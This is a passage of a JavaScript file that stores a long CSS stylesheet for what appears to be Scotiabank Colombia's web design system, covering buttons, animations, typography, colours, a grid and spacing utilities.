var colpatria_contenido = `
<style>
    canvas-co-buddy-tips {
        max-width: 28rem;
    }

    .button--continue:disabled:disabled,
    .button--complete:disabled:disabled {
        background-color: #fff;
        border-color: transparent;
        color: #d6d6d6;
    }

    .button--continue:disabled:disabled .button__icon,
    .button--complete:disabled:disabled .button__icon {
        background: #f6f6f6;
        border: 1px solid #d6d6d6;
    }

    canvas-svg.flex {
        display: flex;
        align-items: center;
    }

    .button--back .button__text:after,
    .button--skip .button__text:after {
        content: "";
        position: relative;
        display: block;
        top: .2rem;
        height: .1rem;
        background: black;
        opacity: 0;
    }

    .button--back:after,
    .button--skip:after {
        border-radius: .4rem;
        box-shadow: 0 0 0 .1rem #fff, 0 0 0 .2rem #788591, 0 0 0 .5rem #e3e7e8;
        content: " ";
        display: inline-block;
        height: calc(100% + 0rem);
        left: 0rem;
        opacity: 0;
        position: absolute;
        top: 0rem;
        transition: opacity ease-in-out .2s;
        width: calc(100% + 0rem);
    }

    .button--continue .button__icon:after,
    .button--complete .button__icon:after {
        border-radius: 50%;
        box-shadow: 0 0 0 .1rem #fff, 0 0 0 .2rem #788591, 0 0 0 .5rem #e3e7e8;
        content: " ";
        display: inline-block;
        height: calc(100% + 0rem);
        left: 0rem;
        opacity: 0;
        position: absolute;
        top: 0rem;
        transition: opacity ease-in-out .2s;
        width: calc(100% + 0rem);
    }

    .sr-only {
        height: 1px;
        left: -10000px;
        overflow: hidden;
        position: absolute;
        top: auto;
        width: 1px
    }

    .fade-in {
        animation-delay: 0;
        animation-duration: .5s;
        animation-fill-mode: forwards;
        animation-name: fadeIn;
        animation-timing-function: ease-in-out
    }

    .slide-in {
        animation-delay: 0;
        animation-duration: .5s;
        animation-name: slideIn
    }

    @keyframes slideIn {
        0% {
            opacity: 0;
            transform: translate(4.8rem)
        }

        to {
            opacity: 1;
            transform: translate(0)
        }
    }

    .slide-up-and-away {
        animation-delay: 0;
        animation-duration: 6s;
        animation-name: slideOnAndAway
    }

    @keyframes slideOnAndAway {
        0% {
            opacity: 0;
            transform: translateY(-100%)
        }

        5% {
            opacity: 1;
            transform: translateY(0)
        }

        95% {
            opacity: 1;
            transform: translateY(0)
        }

        to {
            opacity: 0;
            transform: translateY(-100%)
        }
    }

    .slide-down-and-away {
        animation-delay: 0;
        animation-duration: 6s;
        animation-name: slideOnAndAway
    }

    @media (min-width: 767px) {
        .scale-shrink {
            animation-delay: 0;
            animation-duration: .8s;
            animation-name: scaleShrink
        }

        @keyframes scaleShrink {
            0% {
                height: 15.6rem;
                opacity: 0
            }

            20% {
                height: 20.4rem;
                opacity: 1
            }

            90% {
                height: 20.4rem;
                opacity: 1
            }

            to {
                height: 15.6rem;
                opacity: 1
            }
        }
    }

    @media (max-width: 767px) {
        .scale-shrink {
            animation-delay: 0;
            animation-duration: .8s;
            animation-name: scaleShrink
        }

        @keyframes scaleShrink {
            0% {
                height: 12rem;
                opacity: 0
            }

            20% {
                height: 16.8rem;
                opacity: 1
            }

            90% {
                height: 16.8rem;
                opacity: 1
            }

            to {
                height: 12rem;
                opacity: 1
            }
        }
    }

    .tooltip-fade-enter-active {
        animation-delay: 0;
        animation-duration: .2s;
        animation-fill-mode: forwards;
        animation-name: fadeIn;
        animation-timing-function: ease-in-out
    }

    .tooltip-fade-exit-active {
        animation-delay: 0;
        animation-duration: .2s;
        animation-fill-mode: forwards;
        animation-name: fadeOut;
        animation-timing-function: ease-in-out
    }

    @keyframes fadeOut {
        0% {
            opacity: 1
        }

        to {
            opacity: 0
        }
    }

    .error-fade-enter-active {
        animation-delay: 0;
        animation-duration: .2s;
        animation-fill-mode: forwards;
        animation-name: errorFadeIn;
        animation-timing-function: ease-in-out
    }

    @keyframes errorFadeIn {
        0% {
            opacity: 0
        }

        to {
            opacity: 1
        }
    }

    .error-fade-exit-active {
        animation-delay: 0;
        animation-duration: .15s;
        animation-fill-mode: forwards;
        animation-name: errorFadeOut;
        animation-timing-function: ease-in-out
    }

    @keyframes errorFadeOut {
        0% {
            opacity: 1
        }

        to {
            opacity: 0
        }
    }

    html,
    body,
    div,
    span,
    applet,
    object,
    iframe,
    h1,
    h2,
    h3,
    h4,
    h5,
    h6,
    p,
    blockquote,
    pre,
    a,
    abbr,
    acronym,
    address,
    big,
    cite,
    code,
    del,
    dfn,
    em,
    img,
    ins,
    kbd,
    q,
    s,
    samp,
    small,
    strike,
    strong,
    sub,
    sup,
    tt,
    var,
    b,
    u,
    i,
    center,
    dl,
    dt,
    dd,
    ol,
    ul,
    li,
    fieldset,
    form,
    label,
    legend,
    table,
    caption,
    tbody,
    tfoot,
    thead,
    tr,
    th,
    td,
    article,
    aside,
    canvas,
    details,
    embed,
    figure,
    figcaption,
    footer,
    header,
    hgroup,
    menu,
    nav,
    output,
    ruby,
    section,
    summary,
    time,
    mark,
    audio,
    video {
        margin: 0;
        padding: 0;
        border: 0;
        font-family: inherit;
        vertical-align: baseline
    }

    html {
        box-sizing: border-box;
        z-index: 1
    }

    html,
    body {
        -moz-osx-font-smoothing: grayscale;
        -webkit-font-smoothing: antialiased
    }

    *,
    *:before,
    *:after {
        box-sizing: inherit
    }

    input[type=text],
    input[type=password],
    input[type=search],
    textarea {
        appearance: none
    }

    .ruler {
        background-color: #e2e8ee;
        border: 0;
        height: 1px;
        width: 100%
    }

    .link {
        background-color: transparent;
        border: 0;
        border-radius: 0;
        color: #009dd6;
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        outline: none;
        padding: 0;
        text-decoration: none;
        width: -moz-fit-content;
        width: fit-content
    }

    .link:hover,
    .link:focus {
        color: #007eab;
        cursor: pointer
    }

    .link:hover .link__text,
    .link:focus .link__text {
        border-bottom: solid 1px;
        margin-bottom: -1px
    }

    .link__text:hover,
    .link__text:focus {
        border-bottom: solid 1px;
        margin-bottom: -1px
    }

    .link__text.link--dotted--hover {
        border-bottom: 1px dotted transparent;
        margin-bottom: 0;
        transition: color .15s ease-in-out, border-bottom .1s ease-in-out
    }

    .link__icon {
        margin-bottom: -.3rem;
        margin-left: .6rem
    }

    .link--dotted {
        border-bottom: dotted 1px
    }

    .link--list-item {
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif";
        font-size: 1.4rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 1.8rem;
        margin: 0
    }

    .link--color-default,
    .link--color-black {
        color: #333
    }

    .link--color-default:hover,
    .link--color-default:focus,
    .link--color-default:active,
    .link--color-black:hover,
    .link--color-black:focus,
    .link--color-black:active {
        color: #333
    }

    .link--color-help,
    .link--color-red {
        color: #ec111a
    }

    .link--color-help:hover,
    .link--color-help:focus,
    .link--color-help:active,
    .link--color-red:hover,
    .link--color-red:focus,
    .link--color-red:active {
        color: #ec111a
    }

    .brand {
        color: #333;
        text-decoration: none
    }

    .brand__icon+.brand__title {
        margin-left: 1.2rem
    }

    .brand__icon {
        height: 3.1rem;
        width: 3.1rem
    }

    .brand-line {
        border: 0;
        border-radius: 2rem;
        border-top: .2rem solid #ec111a;
        margin: 0;
        width: 2.8rem
    }

    .container {
        max-width: 1440px;
        min-width: 248px;
        position: relative;
        width: auto
    }

    @media (min-width: 0) {
        .container {
            margin: 0 3rem
        }
    }

    @media (min-width: 768px) {
        .container {
            margin: 0 2.4rem
        }
    }

    @media (min-width: 922px) {
        .container {
            margin: 0 2.1rem
        }
    }

    @media (min-width: 1200px) {
        .container {
            margin: 0 1.8rem
        }
    }

    .container--fluid {
        margin: 0;
        max-width: 100%;
        width: 100%
    }

    @media (min-width: 1488px) {
        .container.container--center {
            margin: 0 auto
        }
    }

    .direction--row {
        display: flex;
        flex-basis: auto;
        flex-grow: 1;
        flex-shrink: 1;
        flex-direction: row;
        flex-wrap: wrap;
        position: relative
    }

    .direction--nowrap {
        flex-wrap: nowrap
    }

    .direction--col {
        display: flex;
        flex-basis: auto;
        flex-grow: 1;
        flex-shrink: 1;
        flex-direction: column;
        flex-wrap: wrap;
        position: relative
    }

    @media (min-width: 0) {
        .direction--bleed-gutter {
            margin: 0 -.6rem
        }
    }

    @media (min-width: 768px) {
        .direction--bleed-gutter {
            margin: 0 -1.2rem
        }
    }

    @media (min-width: 922px) {
        .direction--bleed-gutter {
            margin: 0 -1.5rem
        }
    }

    @media (min-width: 1200px) {
        .direction--bleed-gutter {
            margin: 0 -1.8rem
        }
    }

    @media (min-width: 0) {
        .col-xs-1 {
            flex: 0 0 8.3333333333%;
            max-width: 8.3333333333%;
            padding: 0 .6rem
        }

        .col-xs-2 {
            flex: 0 0 16.6666666667%;
            max-width: 16.6666666667%;
            padding: 0 .6rem
        }

        .col-xs-3 {
            flex: 0 0 25%;
            max-width: 25%;
            padding: 0 .6rem
        }

        .col-xs-4 {
            flex: 0 0 33.3333333333%;
            max-width: 33.3333333333%;
            padding: 0 .6rem
        }

        .col-xs-5 {
            flex: 0 0 41.6666666667%;
            max-width: 41.6666666667%;
            padding: 0 .6rem
        }

        .col-xs-6 {
            flex: 0 0 50%;
            max-width: 50%;
            padding: 0 .6rem
        }

        .col-xs-7 {
            flex: 0 0 58.3333333333%;
            max-width: 58.3333333333%;
            padding: 0 .6rem
        }

        .col-xs-8 {
            flex: 0 0 66.6666666667%;
            max-width: 66.6666666667%;
            padding: 0 .6rem
        }

        .col-xs-9 {
            flex: 0 0 75%;
            max-width: 75%;
            padding: 0 .6rem
        }

        .col-xs-10 {
            flex: 0 0 83.3333333333%;
            max-width: 83.3333333333%;
            padding: 0 .6rem
        }

        .col-xs-11 {
            flex: 0 0 91.6666666667%;
            max-width: 91.6666666667%;
            padding: 0 .6rem
        }

        .col-xs-12 {
            flex: 0 0 100%;
            max-width: 100%;
            padding: 0 .6rem
        }

        .offset-xs-0 {
            margin-left: 0%
        }

        .offset-xs-1 {
            margin-left: calc(8.3333333333%)
        }

        .offset-xs-2 {
            margin-left: calc(16.6666666667%)
        }

        .offset-xs-3 {
            margin-left: 25%
        }

        .offset-xs-4 {
            margin-left: calc(33.3333333333%)
        }

        .offset-xs-5 {
            margin-left: calc(41.6666666667%)
        }

        .offset-xs-6 {
            margin-left: 50%
        }

        .offset-xs-7 {
            margin-left: calc(58.3333333333%)
        }

        .offset-xs-8 {
            margin-left: calc(66.6666666667%)
        }

        .offset-xs-9 {
            margin-left: 75%
        }

        .offset-xs-10 {
            margin-left: calc(83.3333333333%)
        }

        .offset-xs-11 {
            margin-left: calc(91.6666666667%)
        }

        .offset-xs-12 {
            margin-left: 100%
        }
    }

    @media (min-width: 0) and (max-width: 767px) {
        .xs-no-wrap {
            flex-wrap: nowrap
        }
    }

    @media (min-width: 768px) {
        .col-sm-1 {
            flex: 0 0 8.3333333333%;
            max-width: 8.3333333333%;
            padding: 0 1.2rem
        }

        .col-sm-2 {
            flex: 0 0 16.6666666667%;
            max-width: 16.6666666667%;
            padding: 0 1.2rem
        }

        .col-sm-3 {
            flex: 0 0 25%;
            max-width: 25%;
            padding: 0 1.2rem
        }

        .col-sm-4 {
            flex: 0 0 33.3333333333%;
            max-width: 33.3333333333%;
            padding: 0 1.2rem
        }

        .col-sm-5 {
            flex: 0 0 41.6666666667%;
            max-width: 41.6666666667%;
            padding: 0 1.2rem
        }

        .col-sm-6 {
            flex: 0 0 50%;
            max-width: 50%;
            padding: 0 1.2rem
        }

        .col-sm-7 {
            flex: 0 0 58.3333333333%;
            max-width: 58.3333333333%;
            padding: 0 1.2rem
        }

        .col-sm-8 {
            flex: 0 0 66.6666666667%;
            max-width: 66.6666666667%;
            padding: 0 1.2rem
        }

        .col-sm-9 {
            flex: 0 0 75%;
            max-width: 75%;
            padding: 0 1.2rem
        }

        .col-sm-10 {
            flex: 0 0 83.3333333333%;
            max-width: 83.3333333333%;
            padding: 0 1.2rem
        }

        .col-sm-11 {
            flex: 0 0 91.6666666667%;
            max-width: 91.6666666667%;
            padding: 0 1.2rem
        }

        .col-sm-12 {
            flex: 0 0 100%;
            max-width: 100%;
            padding: 0 1.2rem
        }

        .offset-sm-0 {
            margin-left: 0%
        }

        .offset-sm-1 {
            margin-left: calc(8.3333333333%)
        }

        .offset-sm-2 {
            margin-left: calc(16.6666666667%)
        }

        .offset-sm-3 {
            margin-left: 25%
        }

        .offset-sm-4 {
            margin-left: calc(33.3333333333%)
        }

        .offset-sm-5 {
            margin-left: calc(41.6666666667%)
        }

        .offset-sm-6 {
            margin-left: 50%
        }

        .offset-sm-7 {
            margin-left: calc(58.3333333333%)
        }

        .offset-sm-8 {
            margin-left: calc(66.6666666667%)
        }

        .offset-sm-9 {
            margin-left: 75%
        }

        .offset-sm-10 {
            margin-left: calc(83.3333333333%)
        }

        .offset-sm-11 {
            margin-left: calc(91.6666666667%)
        }

        .offset-sm-12 {
            margin-left: 100%
        }
    }

    @media (min-width: 768px) and (max-width: 921px) {
        .sm-no-wrap {
            flex-wrap: nowrap
        }
    }

    @media (min-width: 922px) {
        .col-md-1 {
            flex: 0 0 8.3333333333%;
            max-width: 8.3333333333%;
            padding: 0 1.5rem
        }

        .col-md-2 {
            flex: 0 0 16.6666666667%;
            max-width: 16.6666666667%;
            padding: 0 1.5rem
        }

        .col-md-3 {
            flex: 0 0 25%;
            max-width: 25%;
            padding: 0 1.5rem
        }

        .col-md-4 {
            flex: 0 0 33.3333333333%;
            max-width: 33.3333333333%;
            padding: 0 1.5rem
        }

        .col-md-5 {
            flex: 0 0 41.6666666667%;
            max-width: 41.6666666667%;
            padding: 0 1.5rem
        }

        .col-md-6 {
            flex: 0 0 50%;
            max-width: 50%;
            padding: 0 1.5rem
        }

        .col-md-7 {
            flex: 0 0 58.3333333333%;
            max-width: 58.3333333333%;
            padding: 0 1.5rem
        }

        .col-md-8 {
            flex: 0 0 66.6666666667%;
            max-width: 66.6666666667%;
            padding: 0 1.5rem
        }

        .col-md-9 {
            flex: 0 0 75%;
            max-width: 75%;
            padding: 0 1.5rem
        }

        .col-md-10 {
            flex: 0 0 83.3333333333%;
            max-width: 83.3333333333%;
            padding: 0 1.5rem
        }

        .col-md-11 {
            flex: 0 0 91.6666666667%;
            max-width: 91.6666666667%;
            padding: 0 1.5rem
        }

        .col-md-12 {
            flex: 0 0 100%;
            max-width: 100%;
            padding: 0 1.5rem
        }

        .offset-md-0 {
            margin-left: 0%
        }

        .offset-md-1 {
            margin-left: calc(8.3333333333%)
        }

        .offset-md-2 {
            margin-left: calc(16.6666666667%)
        }

        .offset-md-3 {
            margin-left: 25%
        }

        .offset-md-4 {
            margin-left: calc(33.3333333333%)
        }

        .offset-md-5 {
            margin-left: calc(41.6666666667%)
        }

        .offset-md-6 {
            margin-left: 50%
        }

        .offset-md-7 {
            margin-left: calc(58.3333333333%)
        }

        .offset-md-8 {
            margin-left: calc(66.6666666667%)
        }

        .offset-md-9 {
            margin-left: 75%
        }

        .offset-md-10 {
            margin-left: calc(83.3333333333%)
        }

        .offset-md-11 {
            margin-left: calc(91.6666666667%)
        }

        .offset-md-12 {
            margin-left: 100%
        }
    }

    @media (min-width: 922px) and (max-width: 1199px) {
        .md-no-wrap {
            flex-wrap: nowrap
        }
    }

    @media (min-width: 1200px) {
        .col-lg-1 {
            flex: 0 0 8.3333333333%;
            max-width: 8.3333333333%;
            padding: 0 1.8rem
        }

        .col-lg-2 {
            flex: 0 0 16.6666666667%;
            max-width: 16.6666666667%;
            padding: 0 1.8rem
        }

        .col-lg-3 {
            flex: 0 0 25%;
            max-width: 25%;
            padding: 0 1.8rem
        }

        .col-lg-4 {
            flex: 0 0 33.3333333333%;
            max-width: 33.3333333333%;
            padding: 0 1.8rem
        }

        .col-lg-5 {
            flex: 0 0 41.6666666667%;
            max-width: 41.6666666667%;
            padding: 0 1.8rem
        }

        .col-lg-6 {
            flex: 0 0 50%;
            max-width: 50%;
            padding: 0 1.8rem
        }

        .col-lg-7 {
            flex: 0 0 58.3333333333%;
            max-width: 58.3333333333%;
            padding: 0 1.8rem
        }

        .col-lg-8 {
            flex: 0 0 66.6666666667%;
            max-width: 66.6666666667%;
            padding: 0 1.8rem
        }

        .col-lg-9 {
            flex: 0 0 75%;
            max-width: 75%;
            padding: 0 1.8rem
        }

        .col-lg-10 {
            flex: 0 0 83.3333333333%;
            max-width: 83.3333333333%;
            padding: 0 1.8rem
        }

        .col-lg-11 {
            flex: 0 0 91.6666666667%;
            max-width: 91.6666666667%;
            padding: 0 1.8rem
        }

        .col-lg-12 {
            flex: 0 0 100%;
            max-width: 100%;
            padding: 0 1.8rem
        }

        .offset-lg-0 {
            margin-left: 0%
        }

        .offset-lg-1 {
            margin-left: calc(8.3333333333%)
        }

        .offset-lg-2 {
            margin-left: calc(16.6666666667%)
        }

        .offset-lg-3 {
            margin-left: 25%
        }

        .offset-lg-4 {
            margin-left: calc(33.3333333333%)
        }

        .offset-lg-5 {
            margin-left: calc(41.6666666667%)
        }

        .offset-lg-6 {
            margin-left: 50%
        }

        .offset-lg-7 {
            margin-left: calc(58.3333333333%)
        }

        .offset-lg-8 {
            margin-left: calc(66.6666666667%)
        }

        .offset-lg-9 {
            margin-left: 75%
        }

        .offset-lg-10 {
            margin-left: calc(83.3333333333%)
        }

        .offset-lg-11 {
            margin-left: calc(91.6666666667%)
        }

        .offset-lg-12 {
            margin-left: 100%
        }
    }

    @media (min-width: 1200px) and (max-width: 4000px) {
        .lg-no-wrap {
            flex-wrap: nowrap
        }
    }

    .hide {
        display: none
    }

    @media (min-width: 0) and (max-width: 767px) {
        .hide--xs {
            display: none
        }
    }

    @media (min-width: 768px) and (max-width: 921px) {
        .hide--sm {
            display: none
        }
    }

    @media (min-width: 922px) and (max-width: 1199px) {
        .hide--md {
            display: none
        }
    }

    @media (min-width: 1200px) and (max-width: 4000px) {
        .hide--lg {
            display: none
        }
    }

    @font-face {
        font-family: Scotia Light;
        src: url(https://cdn.agilitycms.com/scotiabank-colombia/canvas/fonts/Scotia_W_Lt)
    }

    @font-face {
        font-family: Scotia Regular;
        src: url(https://cdn.agilitycms.com/scotiabank-colombia/canvas/fonts/Scotia_W_Rg)
    }

    @font-face {
        font-family: Scotia Bold;
        src: url(https://cdn.agilitycms.com/scotiabank-colombia/canvas/fonts/Scotia_W_Bd)
    }

    @font-face {
        font-family: Scotia Headline;
        src: url(https://cdn.agilitycms.com/scotiabank-colombia/canvas/fonts/Scotia_W_Headline)
    }

    @font-face {
        font-family: text-security-disc;
        src: url(https://cdn.agilitycms.com/scotiabank-colombia/canvas/fonts/text-security-disc)
    }

    html,
    body {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 10px;
        font-weight: initial;
        letter-spacing: 0;
        line-height: 18px;
        margin: 0;
        color: #333
    }

    .hero,
    .headline--large {
        font-family: Scotia Headline, Arial, Helvetica, "sans-serif";
        font-size: 3.6rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 4.1rem;
        margin: 0
    }

    @media (min-width: 922px) {

        .hero,
        .headline--large {
            font-size: 4.8rem;
            line-height: 5.4rem
        }
    }

    .heading,
    .headline--medium {
        font-family: Scotia Headline, Arial, Helvetica, "sans-serif";
        font-size: 2.8rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 3.5rem;
        margin: 0
    }

    @media (min-width: 922px) {

        .heading,
        .headline--medium {
            font-size: 3.2rem;
            line-height: 4rem
        }
    }

    .subheading,
    .headline--small {
        font-family: Scotia Headline, Arial, Helvetica, "sans-serif";
        font-size: 2.4rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 3rem;
        margin: 0
    }

    .text {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.8rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 2.7rem;
        margin: 0
    }

    .text--introduction {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 2rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 2.8rem;
        margin: 0
    }

    .text--subtitle-1,
    .text--subtitle-2 {
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif";
        font-size: 1.8rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 2.7rem;
        margin: 0
    }

    .text--body-1 {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.8rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 2.7rem;
        margin: 0
    }

    .text--small,
    .text--body-2 {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 2.4rem;
        margin: 0
    }

    .text--caption {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.4rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 1.8rem;
        margin: 0
    }

    .text--footer,
    .text--legal {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.2rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 1.8rem;
        margin: 0
    }

    .text--regular {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif"
    }

    .text--bold {
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif"
    }

    .text--light {
        font-family: Scotia Light, Arial, Helvetica, "sans-serif"
    }

    .text--uppercase {
        text-transform: uppercase
    }

    .list {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        color: #333;
        list-style-position: outside;
        font-size: inherit;
        line-height: inherit;
        padding-left: 3.6rem
    }

    .list__item {
        padding-left: 1.2rem;
        margin-bottom: .6rem
    }

    .list--unstyled {
        list-style: none;
        margin: 0;
        padding-left: 0
    }

    .list--unstyled li {
        padding-left: 0
    }

    .list--inline li {
        display: inline-block;
        margin-right: 2.4rem
    }

    .list--inline li:last-child {
        margin: 0
    }

    .list--no-indent {
        padding-left: 1.8rem
    }

    .color--brand {
        color: #ec111a
    }

    .color--default {
        color: #333
    }

    .color--alternate {
        color: #757575
    }

    .color--highlight {
        color: #009dd6
    }

    .color--success {
        color: #138468
    }

    .color--notification {
        color: #7849b8
    }

    .color--info {
        color: #007eab
    }

    .color--error {
        color: #be061b
    }

    .color--disabled {
        color: #d6d6d6
    }

    .color--outline {
        color: #e2e8ee
    }

    .color--background-alternate {
        color: #fafbfd
    }

    .color--background {
        color: #fff
    }

    .color--red {
        color: #ec111a
    }

    .color--orange {
        color: #fb6330
    }

    .color--pink {
        color: #f2609e
    }

    .color--purple {
        color: #7849b8
    }

    .color--green {
        color: #138468
    }

    .color--blue {
        color: #009dd6
    }

    .color--black {
        color: #333
    }

    .color--white {
        color: #fff
    }

    .color--light-red {
        color: #ff969c
    }

    .color--light-orange {
        color: #ffba8e
    }

    .color--light-pink {
        color: #fda8de
    }

    .color--light-purple {
        color: #aea9f4
    }

    .color--light-green {
        color: #84d9c6
    }

    .color--light-blue {
        color: #91ddf8
    }

    .color--dark-red {
        color: #be061b
    }

    .color--dark-blue {
        color: #007eab
    }

    .color--gray-100 {
        color: #fafbfd
    }

    .color--gray-200 {
        color: #f6f7fc
    }

    .color--gray-300 {
        color: #f6f6f6
    }

    .color--gray-400 {
        color: #e2e8ee
    }

    .color--gray-500 {
        color: #d6d6d6
    }

    .color--gray-600 {
        color: #757575
    }

    .color--gray-700 {
        color: #949494
    }

    .background--brand {
        background-color: #ec111a
    }

    .background--default {
        background-color: #333
    }

    .background--alternate {
        background-color: #757575
    }

    .background--highlight {
        background-color: #009dd6
    }

    .background--success {
        background-color: #138468
    }

    .background--notification {
        background-color: #7849b8
    }

    .background--info {
        background-color: #007eab
    }

    .background--error {
        background-color: #be061b
    }

    .background--disabled {
        background-color: #d6d6d6
    }

    .background--outline {
        background-color: #e2e8ee
    }

    .background--background-alternate {
        background-color: #fafbfd
    }

    .background--background {
        background-color: #fff
    }

    .background--red {
        background-color: #ec111a
    }

    .background--orange {
        background-color: #fb6330
    }

    .background--pink {
        background-color: #f2609e
    }

    .background--purple {
        background-color: #7849b8
    }

    .background--green {
        background-color: #138468
    }

    .background--blue {
        background-color: #009dd6
    }

    .background--black {
        background-color: #333
    }

    .background--white {
        background-color: #fff
    }

    .background--light-red {
        background-color: #ff969c
    }

    .background--light-orange {
        background-color: #ffba8e
    }

    .background--light-pink {
        background-color: #fda8de
    }

    .background--light-purple {
        background-color: #aea9f4
    }

    .background--light-green {
        background-color: #84d9c6
    }

    .background--light-blue {
        background-color: #91ddf8
    }

    .background--dark-red {
        background-color: #be061b
    }

    .background--dark-blue {
        background-color: #007eab
    }

    .background--gray-100 {
        background-color: #fafbfd
    }

    .background--gray-200 {
        background-color: #f6f7fc
    }

    .background--gray-300 {
        background-color: #f6f6f6
    }

    .background--gray-400 {
        background-color: #e2e8ee
    }

    .background--gray-500 {
        background-color: #d6d6d6
    }

    .background--gray-600 {
        background-color: #757575
    }

    .background--gray-700 {
        background-color: #949494
    }

    .alert--color--success {
        color: #138468
    }

    .alert--background-success {
        background-color: #d0e6e1
    }

    .alert--color--info {
        color: #007eab
    }

    .alert--background-info {
        background-color: #ccebf7
    }

    .alert--color--error {
        color: #be061b
    }

    .alert--background-error {
        background-color: #fbcfd1
    }

    .card {
        background-color: #fff;
        border: .1rem solid #e2e8ee;
        border-radius: .8rem;
        box-shadow: 0 .2rem 1rem #00225b1c;
        padding: 3.6rem
    }

    @media (max-width: 767px) {
        .card {
            padding: 2.4rem
        }
    }

    .card--on-alternate-background {
        border: 0
    }

    .card--margin-offset {
        margin: 0 -2.4rem
    }

    .card--flat {
        box-shadow: none
    }

    .card--flat-dashed {
        border: 1px dashed #e2e8ee
    }

    .block,
    .button.block {
        display: flex;
        flex-direction: row
    }

    .block--centered {
        align-items: center;
        justify-content: center
    }

    .block--left {
        align-items: center;
        justify-content: flex-start
    }

    .block--right {
        align-items: center;
        justify-content: flex-end
    }

    @media (min-width: 0) {
        .block-xs--centered {
            align-items: center;
            justify-content: center
        }

        .block-xs--left {
            align-items: center;
            justify-content: flex-start
        }

        .block-xs--right {
            align-items: center;
            justify-content: flex-end
        }
    }

    @media (min-width: 768px) {
        .block-sm--centered {
            align-items: center;
            justify-content: center
        }

        .block-sm--left {
            align-items: center;
            justify-content: flex-start
        }

        .block-sm--right {
            align-items: center;
            justify-content: flex-end
        }
    }

    @media (min-width: 922px) {
        .block-md--centered {
            align-items: center;
            justify-content: center
        }

        .block-md--left {
            align-items: center;
            justify-content: flex-start
        }

        .block-md--right {
            align-items: center;
            justify-content: flex-end
        }
    }

    @media (min-width: 1200px) {
        .block-lg--centered {
            align-items: center;
            justify-content: center
        }

        .block-lg--left {
            align-items: center;
            justify-content: flex-start
        }

        .block-lg--right {
            align-items: center;
            justify-content: flex-end
        }
    }

    .overflow {
        overflow: auto
    }

    .overflow-x {
        overflow-x: auto
    }

    .overflow-y {
        overflow-y: auto
    }

    .image--responsive {
        max-width: 100%;
        height: auto
    }

    @media (min-width: 0) {
        .margin {
            margin-bottom: 3.6rem;
            margin-top: 3.6rem
        }

        .margin--top {
            margin-top: 3.6rem
        }

        .margin--bottom {
            margin-bottom: 3.6rem
        }

        .margin--left {
            margin-left: 3.6rem
        }

        .margin--right {
            margin-right: 3.6rem
        }

        .margin-xs {
            margin-bottom: 3.6rem;
            margin-top: 3.6rem
        }

        .margin-xs--top {
            margin-top: 3.6rem
        }

        .margin-xs--bottom {
            margin-bottom: 3.6rem
        }

        .margin-xs--left {
            margin-left: 3.6rem
        }

        .margin-xs--right {
            margin-right: 3.6rem
        }

        .margin-xs-0 {
            margin-bottom: 0rem;
            margin-top: 0rem
        }

        .margin-xs-0--top {
            margin-top: 0rem
        }

        .margin-xs-0--bottom {
            margin-bottom: 0rem
        }

        .margin-xs-0--left {
            margin-left: 0rem
        }

        .margin-xs-0--right {
            margin-right: 0rem
        }

        .margin-xs-6 {
            margin-bottom: .6rem;
            margin-top: .6rem
        }

        .margin-xs-6--top {
            margin-top: .6rem
        }

        .margin-xs-6--bottom {
            margin-bottom: .6rem
        }

        .margin-xs-6--left {
            margin-left: .6rem
        }

        .margin-xs-6--right {
            margin-right: .6rem
        }

        .margin-xs-12 {
            margin-bottom: 1.2rem;
            margin-top: 1.2rem
        }

        .margin-xs-12--top {
            margin-top: 1.2rem
        }

        .margin-xs-12--bottom {
            margin-bottom: 1.2rem
        }

        .margin-xs-12--left {
            margin-left: 1.2rem
        }

        .margin-xs-12--right {
            margin-right: 1.2rem
        }

        .margin-xs-18 {
            margin-bottom: 1.8rem;
            margin-top: 1.8rem
        }

        .margin-xs-18--top {
            margin-top: 1.8rem
        }

        .margin-xs-18--bottom {
            margin-bottom: 1.8rem
        }

        .margin-xs-18--left {
            margin-left: 1.8rem
        }

        .margin-xs-18--right {
            margin-right: 1.8rem
        }

        .margin-xs-24 {
            margin-bottom: 2.4rem;
            margin-top: 2.4rem
        }

        .margin-xs-24--top {
            margin-top: 2.4rem
        }

        .margin-xs-24--bottom {
            margin-bottom: 2.4rem
        }

        .margin-xs-24--left {
            margin-left: 2.4rem
        }

        .margin-xs-24--right {
            margin-right: 2.4rem
        }

        .margin-xs-30 {
            margin-bottom: 3rem;
            margin-top: 3rem
        }

        .margin-xs-30--top {
            margin-top: 3rem
        }

        .margin-xs-30--bottom {
            margin-bottom: 3rem
        }

        .margin-xs-30--left {
            margin-left: 3rem
        }

        .margin-xs-30--right {
            margin-right: 3rem
        }

        .margin-xs-36 {
            margin-bottom: 3.6rem;
            margin-top: 3.6rem
        }

        .margin-xs-36--top {
            margin-top: 3.6rem
        }

        .margin-xs-36--bottom {
            margin-bottom: 3.6rem
        }

        .margin-xs-36--left {
            margin-left: 3.6rem
        }

        .margin-xs-36--right {
            margin-right: 3.6rem
        }

        .margin-xs-42 {
            margin-bottom: 4.2rem;
            margin-top: 4.2rem
        }

        .margin-xs-42--top {
            margin-top: 4.2rem
        }

        .margin-xs-42--bottom {
            margin-bottom: 4.2rem
        }

